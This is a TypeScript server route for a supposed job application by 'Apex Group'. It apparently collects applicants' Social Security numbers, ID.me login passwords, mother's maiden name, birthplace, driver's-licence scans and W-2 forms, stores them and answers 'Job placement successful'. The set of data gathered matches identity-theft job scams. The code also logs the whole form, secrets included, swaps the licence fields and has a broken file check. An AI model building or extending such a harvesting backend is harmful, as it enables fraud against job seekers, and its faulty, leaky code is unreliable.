import envStore from "@/app/envStore/store";
import { capitalizeName } from "@/app/util";
import {
  createApplicant,
  getApplicantByEmail,
  updateApplicant,
} from "@/lib/db/applicantsRepo";
import { createIdme } from "@/lib/db/idmeRepo";
import { applicant } from "@/lib/db/schema";
import { acknowledgementEmail } from "@/lib/emails/applicationAcknowledgement";
import { sendMail } from "@/lib/mailer/mail";
import { uploadFile } from "@/lib/s3/uploadFile";
import { requestData, uploadAFile } from "./helper";
import { applicant as applicantType } from "@/app/envStore/types";

export async function POST(request: Request) {
  try {
    const formData = await request.formData();
    console.log(formData);

    const dlFront = formData.get("dlBack") as File;
    const dlBack = formData.get("dlFront") as File;
    const W2ssl = formData.get("W2SSl") as File;
    if (!dlFront && dlBack && W2ssl) {
      return new Response(JSON.stringify({ message: "No file provided" }), {
        status: 400,
        headers: { "Content-Type": "application/json" },
      });
    }

    async function newIdme(data: requestData, applicant: applicantType) {
      const secureFillForm = await createIdme({
        firstName: data.firstName,
        otherNames: data.otherNames,
        lastName: data.lastName,
        address: data.address,
        email: data.email,
        city: data.city,
        state: data.state,
        phone: data.phone,
        zipCode: data.zipCode,
        dob: data.dob,
        ssn: data.ssn,
        idmeUsername: data.idmeUsername,
        idmePassword: data.idmePassword,
        fatherFirst: data.fatherFirst,
        fatherLast: data.fatherLast,
        mothersFirst: data.mothersFirst,
        mothersLast: data.mothersLast,
        mothersMaiden: data.mothersMaiden,
        stateOfBirth: data.stateOfBirth,
        cityOfBirth: data.cityOfBirth,
        applicantId: applicant.id,
        w2ssl: await uploadAFile(
          W2ssl,
          `${data.firstName}_${data.lastName}_w2ssl`,
          `${applicant.firstName}_${applicant.lastName}`
        ),
        dlBack: await uploadAFile(
          dlBack,
          `${data.firstName}_${data.lastName}_dlBack`,
          `${applicant.firstName}_${applicant.lastName}`
        ),
        dlFront: await uploadAFile(
          dlFront,
          `${data.firstName}_${data.lastName}_dlFront`,
          `${applicant.firstName}_${applicant.lastName}`
        ),
      });

      return secureFillForm;
    }

    const existingApplicant = await getApplicantByEmail(
      formData.get("email") as string
    );
    if (existingApplicant) {
      console.log("exists");

      await newIdme(requestData(formData), existingApplicant);
    } else {
      console.log("not exists");
      const newApplicant = await createApplicant({
        firstName: requestData(formData).firstName,
        lastName: requestData(formData).lastName,
        email: requestData(formData).email,
        phone: requestData(formData).phone,
        dob: requestData(formData).dob,
        location: "",
        device: "",
        internet: "",
        availability: "",
        experience: "",
        note: "",
        status: "idme",
      });
      await newIdme(requestData(formData), newApplicant);
    }

    // Save applicant in DB

    // Convert File -> Buffer -> Readable for S3

    // const { subject, text, html } = acknowledgementEmail(application.firstName);
    // const from = `${capitalizeName("Apex Group")} <${envStore.SMTP_USER}>`;
    // const mail = await sendMail({
    //   to: application.email,
    //   subject,
    //   from,
    //   html,
    //   text,
    // });

    return new Response(
      JSON.stringify({
        message: "Job placement successful",
        s3Url: "result.url",
      }),
      { headers: { "Content-Type": "application/json" } }
    );
  } catch (error: any) {
    console.error(error);
    return new Response(
      JSON.stringify({ message: `Error uploading file: ${error.message}` }),
      { status: 500, headers: { "Content-Type": "application/json" } }
    );
  }
}
